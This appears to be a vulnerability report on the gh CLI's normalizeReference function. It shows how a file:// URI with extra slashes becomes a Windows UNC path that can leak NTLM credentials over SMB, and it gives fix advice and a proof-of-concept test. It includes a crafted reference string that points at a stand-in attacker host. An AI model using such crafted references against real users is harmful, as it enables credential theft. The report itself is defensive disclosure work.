### Title
`normalizeReference` UNC path smuggling via `file://` URI with extra slashes leads to SMB/NTLM credential leak on Windows - (File: pkg/cmd/attestation/artifact/artifact.go)

### Summary
`normalizeReference` parses `file://` URIs with `url.ParseRequestURI` and only strips a single leading path separator before calling `filepath.Clean`, but does not validate or reject double-backslash (UNC) results. By supplying a `file://` reference with five slashes after the scheme (e.g. `file://///evilhost/share/artifact`), an attacker can make `uri.Path` contain three leading slashes; after the backslash conversion and single-separator strip on Windows, the result becomes a two-backslash UNC path (`\\evilhost\share\artifact`), which `digestLocalFileArtifact` then passes directly to `os.Open`.

### Finding Description
`normalizeReference` at [1](#0-0)  handles `file://` references: it calls `url.ParseRequestURI(reference)`, converts `/` to the platform separator, and strips **exactly one** leading separator character with `path = path[1:]` before returning `filepath.Clean(path)`.

Because Go's URL authority parsing consumes the literal `//` marker and then reads the authority up to the next `/`, an input with extra leading slashes after `file:` (e.g. `file://///evilhost/share/x`, 5 slashes total) causes `url.ParseRequestURI` to yield an empty `Host` and a `Path` with multiple leading slashes (`///evilhost/share/x`). On Windows (`pathSeparator == '\\'`), the code replaces `/` with `\`, producing three leading backslashes, then strips only one, leaving two leading backslashes: `\\evilhost\share\x`. `filepath.Clean` on Windows recognizes and preserves the `\\host\share` UNC prefix rather than collapsing it, so the function returns a genuine UNC path.

This value flows unmodified into `digestLocalFileArtifact` at [2](#0-1) , which calls `os.Open(filename)` directly with no host allow-listing or UNC rejection. On Windows, `os.Open` of a UNC path triggers an SMB connection attempt to the attacker-controlled host, which by default performs NTLM authentication — a well-known technique for capturing/relaying NTLM credentials (similar to `.lnk`/`.url` UNC leak attacks).

The call chain is `NewDigestedArtifact` → `normalizeReference(reference, os.PathSeparator)` → `digestLocalFileArtifact`, as shown at [3](#0-2) . No validation rejects UNC-shaped results or restricts the parsed path to a local drive; the existing Windows test suite at [4](#0-3)  only covers well-formed local `file:///C:/...` URIs and does not test malformed/multi-slash inputs, so this case is unhandled and untested.

### Impact Explanation
On Windows, a victim who copy-pastes an attacker-supplied `gh attestation verify` command/reference string (e.g. from a README, release note, or script) triggers an outbound SMB connection to an attacker-controlled host during local artifact verification. This can result in NTLM hash capture (crackable offline or relayable) — a credential-exfiltration impact — even though the user believed they were only verifying a local file.

### Likelihood Explanation
Requires the victim to be on Windows and to run `gh attestation verify` with a crafted reference string that they did not construct themselves (e.g., copy-pasted from attacker content), matching the threat model of an unprivileged attacker distributing content the victim executes verbatim. The crafted URI is syntactically unusual (multiple leading slashes) but is valid enough to pass `url.ParseRequestURI` without error, and no existing check filters it out. This is a straightforward, mechanically reproducible bug in `normalizeReference`'s single-strip logic, not merely a theoretical concern, but it does depend on the victim being convinced to run a specific artifact reference string, and the Linux/macOS path is safe since UNC concepts don't apply.

### Recommendation
After converting and stripping separators, explicitly reject results that begin with two consecutive separators (`\\` on Windows) or use `filepath.IsAbs`/`filepath.VolumeName` checks to confirm the path resolves to a local drive-letter path, erroring out on any UNC-shaped path. Alternatively, validate `uri.Host` is empty and `uri.Path` has no more than a single leading slash before processing, rejecting the reference otherwise.

### Proof of Concept
Add a Windows-only unit test to `pkg/cmd/attestation/artifact/artifact_windows_test.go`:
```go
{
    name:          "malicious UNC path via extra slashes",
    reference:     "file://///evilhost/share/artifact",
    pathSeparator: '\\',
    // current buggy behavior returns `\\evilhost\share\artifact` (a UNC path)
},
```
Assert that `normalizeReference` does NOT return a string with a `\\` (double-backslash) prefix, i.e. `require.False(t, strings.HasPrefix(result, `\\`))`, and/or `require.NoError(t, err)` should instead be `require.Error(t, err)` once the fix rejects UNC-shaped paths. Currently the test would fail this assertion, confirming the vulnerability: `result == \\evilhost\share\artifact`, which if passed to `digestLocalFileArtifact`/`os.Open` on a real Windows host would initiate an SMB connection to `evilhost`.

### Citations

**File:** pkg/cmd/attestation/artifact/artifact.go (L34-51)
```go
	case strings.HasPrefix(reference, "file://"):
		uri, err := url.ParseRequestURI(reference)
		if err != nil {
			return "", 0, fmt.Errorf("failed to parse reference URI: %v", err)
		}
		var path string
		if pathSeparator == '/' {
			// Unix paths use forward slashes like URIs, so no need to modify
			path = uri.Path
		} else {
			// Windows paths should be normalized to use backslashes
			path = strings.ReplaceAll(uri.Path, "/", string(pathSeparator))
			// Remove leading slash from Windows paths if present
			if strings.HasPrefix(path, string(pathSeparator)) {
				path = path[1:]
			}
		}
		return filepath.Clean(path), fileArtifactType, nil
```

**File:** pkg/cmd/attestation/artifact/artifact.go (L64-74)
```go
func NewDigestedArtifact(client oci.Client, reference, digestAlg string) (artifact *DigestedArtifact, err error) {
	normalized, artifactType, err := normalizeReference(reference, os.PathSeparator)
	if err != nil {
		return nil, err
	}
	if artifactType == ociArtifactType {
		// TODO: should we allow custom digestAlg for OCI artifacts?
		return digestContainerImageArtifact(normalized, client)
	}
	return digestLocalFileArtifact(normalized, digestAlg)
}
```

**File:** pkg/cmd/attestation/artifact/file.go (L10-15)
```go
func digestLocalFileArtifact(filename, digestAlg string) (*DigestedArtifact, error) {
	data, err := os.Open(filename)
	if err != nil {
		return nil, fmt.Errorf("failed to open local artifact: %v", err)
	}
	defer data.Close()
```

**File:** pkg/cmd/attestation/artifact/artifact_windows_test.go (L11-44)
```go
func TestNormalizeReference(t *testing.T) {
	testCases := []struct {
		name           string
		reference      string
		pathSeparator  rune
		expectedResult string
		expectedType   artifactType
		expectedError  bool
	}{
		{
			name:           "windows file reference without scheme",
			reference:      `c:\path\to\file`,
			pathSeparator:  '\\',
			expectedResult: `c:\path\to\file`,
			expectedType:   fileArtifactType,
			expectedError:  false,
		},
		{
			name:           "windows path",
			reference:      "file:///C:/path/to/file",
			pathSeparator:  '\\',
			expectedResult: `C:\path\to\file`,
			expectedType:   fileArtifactType,
			expectedError:  false,
		},
		{
			name:           "windows path with backslashes",
			reference:      "file:///C:\\path\\to\\file",
			pathSeparator:  '\\',
			expectedResult: `C:\path\to\file`,
			expectedType:   fileArtifactType,
			expectedError:  false,
		},
	}
```
